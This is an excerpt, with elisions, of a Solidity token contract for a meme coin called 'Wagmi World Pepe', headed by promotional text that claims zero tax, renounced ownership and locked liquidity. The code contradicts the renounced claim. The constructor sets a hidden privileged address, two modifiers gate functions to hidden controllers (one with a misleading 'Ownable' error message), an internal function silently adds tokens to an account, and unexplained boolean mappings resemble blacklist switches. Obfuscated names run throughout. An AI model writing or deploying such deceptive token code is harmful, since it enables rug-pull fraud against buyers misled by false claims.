...
/**
🌍🖖 Wagmi World Pepe 🖖🌍 $WWPEPE

⚡️Discover incredible metaverse worlds, games, new friends & more. Worlds are owned and crafted by Pepes.
⚡️The Next Big Joke Of crypto #Wagmi #Pepe #NFT #Joke #Bullish #Degen #Play

✨ZERO TAX! 💯
✨Renounced” 💼
🖖🔒 Locked LP

https://t.me/WagmiWorldPepe
*/
pragma solidity 0.8.18;
abstract contract WWPEPEAs {
...
interface WWPEPEAsii is WWPEPEAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract WWPEPEAsiii is WWPEPEAs {
...
contract WWPEPE is WWPEPEAs, WWPEPEAsi, WWPEPEAsii, WWPEPEAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public WWPEPEAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeToTransfer;
address private WWPEPERooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public WWPEPEPaw;
  address WWPEPEAdr;



    
    constructor(address WWPEPEadressss) {
            // Editable
            WWPEPEAdr = msg.sender;

        _name = "Wagmi World Pepe";
        _symbol = "WWPEPE";
  WWPEPERooter = WWPEPEadressss;        
        uint stgTotalSupply = 1000000000000 * 10**9;
    ...
    function transferFrom(
      ...
      modifier SwapAndLiquify() {
        require(WWPEPERooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function _transfer(
        ...
        unchecked {
            sendamount[from] = fromBalance - dogecoininu;
        }
        sendamount[to] += dogecoininu;
  ...
  modifier walo () {
    require(WWPEPEAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;
    ...
    function process(address account, uint256 dogecoininu) internal virtual {
        ...
        sendamount[account] += dogecoininu;
    ...
    function _burn(address account, uint256 dogecoininu) internal virtual {
        ...
        unchecked {
            sendamount[account] = accountBalance - dogecoininu;
        }
        ALLtotalSupply -= dogecoininu;
